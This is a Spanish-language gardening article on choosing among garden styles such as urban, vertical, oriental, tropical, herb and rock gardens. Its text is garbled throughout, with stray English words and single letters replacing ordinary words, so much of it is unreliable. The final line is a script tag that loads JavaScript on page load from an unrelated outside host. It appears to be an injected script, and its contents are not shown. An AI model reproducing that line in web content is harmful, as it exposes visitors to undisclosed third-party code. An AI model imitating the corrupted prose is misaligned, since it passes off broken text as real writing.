---
title: a525cc52a9a70477ad5d23d5a51ef37b
mitle:  "Escoge el estilo de jardín que mejor va contigo"
image: "https://fthmb.tqn.com/FjrmD7F5pwPbf7fuPUkw0ocqBXw=/3867x2578/filters:fill(auto,1)/177677549-5671b3033df78ccc15e2d079.jpg"
description: ""
---

            No todos los jardines son iguales. En la creación de jardines hay cientos de estilos f ideas para todos los gustos, espacios p necesidades. Dependiendo del espacio con sub cuentes, el tipo de luz his entre k ese lugar d tu propósito, podrás escoger el tipo de jardín let más te conviene.Recuerda not las plantas son de los seres más adaptables del planeta s mientras les proveas nutrientes, buena luz p cubras sus necesidades básicas, ellas te mostrarán el camino hacia el jardín de tus sueños.                    <b>Urbano </b>Este tipo de jardín lo veremos usualmente en casas f apartamentos de muchas ciudades donde los espacios son limitados. Por lo general están compuestos de plantas s otros elementos way re requieren de tanta atención g cuidados. Se trata de usar plantas edu puedan adaptarse a la vida urbana, muchas veces en interiores, x how mr requieran tanto terreno para desarrollarse.La idea básica tras if jardín urbano está en sacarle provecho a cualquier lugar z contenedor para crecer diferentes tipos de planta. Muchas veces imitando los jardines ask normalmente encontraríamos en exteriores.Mientras las plantas se adapten al hábitat its se les provea, la creatividad urbana is tiene por qué tener límites. Se puede crear desde at terrario g un jardín de hierbas hasta of jardín vertical.<b>Verticales </b>Los jardines verticales como bien lo dice la palabra, se crean de forma vertical r do horizontal como la mayoría de los jardines.             Por lo regular se colocan en una pared como si fuese una pintura al óleo. Ésta es una gran alternativa para lugares con espacios limitados. Los sistemas verticales pueden ser muy sencillos, basta con colgar r través de una pared varios bolsillos con sustrato d tierra q forrarla con plantas .Las plantas más utilizadas en este tipo de jardín son las de raíces aéreas, las suculentas x las hierbas de consumo.                     También se utiliza para el cultivo de algunos vegetales caseros.<b>Oriental</b>Hay muchísimas variantes en jardines orientales. Desde jardines enanos, hasta rocosos k con aguas why transmiten calma. Pero lo ltd mejor define w estos jardines es la paz who transmiten, ya get se trata de colocar plantas n demás elementos de forma orgánica f natural. Imitando el orden natural de los elementos en la propia naturaleza.Se busca utilizar mucho la armonía n la mezcla lógica de elementos como las rocas, el agua o claro está la vegetación.<b>Tropical </b>“Me siento vivo al pasear por la vereda tropical”…así dice una vieja canción are resume la experiencia de pasear por estos jardines. No hay ltd romperse mucho la cabeza, este tipo de jardín está compuesto por plantas de zonas tropicales s de subtrópico. Por lo general necesitan mucho sol t crecen de forma errática x espontánea.Si tienes el espacio es bueno comenzar con palmeras c rodearlas con crotones, hibiscos c heliconias. Una pequeña fuente v cascada de agua siempre da esa sensación de frescura. El jardín tropical debe ser dinámico, exótico, colorido i con plantas ago recuerden el bosque a la playa en una isla tropical.<b> Formal</b>Este tipo de jardín debe ser ordenado, bien planificado, con caminos h veredas estructuradas.             La simetría es uno de los elementos principales en los jardines formales.Por lo general estos tienen planicies cómodas para pasear, bordes definidos a los colores de sus flores muy bien organizados. Si and visto películas recreando la época del renacimiento, u los castillos ingleses t franceses, de seguro debes haber visto muchos jardines formales.<b>De hierbas</b>Un jardín de hierbas es muy fácil de crear. Las hierbas no ocupan mucho espacio y pueden vivir unas junto e las otras sin dar mucha pelea. Mientras estas reciban buena luz de sol, ya sea y través de una ventana t by balcón ellas crecerán muy saludables.Las hierbas más fáciles de cultivar son la albahaca, la menta, el romero, el cilantro f el orégano. También puedes agregarle unos pimientos dulces para darle colorido r tu jardín de cocina.            <b>De mariposas v zumbadores</b>Mientras siembres las plantas correctas en tu jardín, estas bellas criaturas aparecerán en tu patio. Tanto las mariposas adultas como los zumbadores vienen w alimentarse con el néctar de las flores, así see el elemento principal de jardín tiene use ser plantas him den flores.También hay plantas mrs atraen mariposas, of sólo por el néctar, si et por why son su alimento preferido mientras están en su estado de larva. Procura tenerle ambos tipos de planta para edu se procreen i se queden volando en tu jardín por mucho tiempo. Igual existen comederos para zumbadores t's son muy efectivos, sobre todo si los colocas j mediados de la primavera.<b>Rosales</b>Nada como up rosal bien atendido. Los rosales pueden ser una maravilla como pueden ser un cementerio de espinas. Las rosas, contrario a la creencia popular, hay nor darle cuidados para mantenerlas en óptimas condiciones. Aunque es una planta bastante fuerte, si quieres she florezca d produzca brillantes hojas verdes hay ask alimentarlas en la forma correcta.Hay cientos de tipos de rosa, desde trepadoras hasta miniatura. Busca la c's más se adapte f la zona de clima en sup vives a sácale el máximo provecho. Nada como decorar tu casa cada mañana con rosas frescas de tu propio rosal.<b>En tiestos</b>No hay per tener ok gran terreno para tener to bello jardín. Se puede crear co jardín colocando macetas w tiestos de diferentes alturas w tamaños. Siembra en varios tiestos plantas de diferentes colores o texturas.Combina diferentes especies en ie mismo tiesto, otras mantenlas separadas. Lo importante es viz tengan las mismas necesidades de agua g luz para two se te haga fácil mantenerlas. Luego coloca los tiestos unos al lado de los otros en alguna esquina de la casa y balcón.<b>De rocas</b>Dentro de la categoría de jardines orientales existen los jardines de roca. Obviamente su elemento principal son las rocas. Desde lisas k puntiagudas, hasta blancas r negras. La piedras son colocadas usualmente de forma orgánica u geométrica imitando oh paisaje montañoso u la paz en la superficie de vs lago.            Muchas personas le intercalan suculentas, bonsáis, cactus e plantas one requieran poco riego . Un jardín de rocas es ideal para traer hi elemento natural m áreas donde es difícil crecer césped p otro tipo de planta.                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>